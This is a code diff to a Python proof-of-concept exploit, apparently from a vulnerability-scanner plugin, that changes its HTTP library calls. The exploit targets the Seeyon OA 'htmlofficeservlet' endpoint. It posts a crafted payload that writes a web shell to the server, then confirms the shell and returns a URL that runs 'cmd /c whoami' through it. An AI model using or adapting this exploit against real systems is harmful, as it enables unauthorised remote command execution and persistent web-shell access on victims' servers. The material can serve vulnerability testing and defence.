@@ -7,7 +7,7 @@ See the file 'LICENSE' for copying permission
 """
 
 import base64
-import requests
+from lib.core.Request import request
 import hashlib
 from urllib.parse import urlparse
 from plugin.random_ua import get_random_ua
@@ -80,7 +80,7 @@ def poc(url):
 
     try:
         # just prevent being attacked
-        res = requests.get(shell_url, headers=headers, timeout=5, allow_redirects=False, verify=False)
+        res = request.get(shell_url, headers=headers, timeout=5, allow_redirects=False, verify=False)
         if res.status_code == 200 and ":-)" in res.text:
             return shell_url+'?pwd=fuckxxxx&cmd=cmd /c whoami'
     except:
@@ -100,8 +100,8 @@ def poc(url):
         payload_shell_len)).replace('qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdeAD5yRQHwLoiqRjidg66',
                                     payload_shell_name), 'utf-8') + payload_shell
     try:
-        requests.post(url=url + "/seeyon/htmlofficeservlet", data=payload, headers=headers, timeout=5, allow_redirects=False, verify=False)
-        res = requests.get(url=shell_url, headers=headers, timeout=5, allow_redirects=False, verify=False).text
+        request.post(url=url + "/seeyon/htmlofficeservlet", data=payload, headers=headers, timeout=5, allow_redirects=False, verify=False)
+        res = request.get(url=shell_url, headers=headers, timeout=5, allow_redirects=False, verify=False).text
     except:
         return False
 
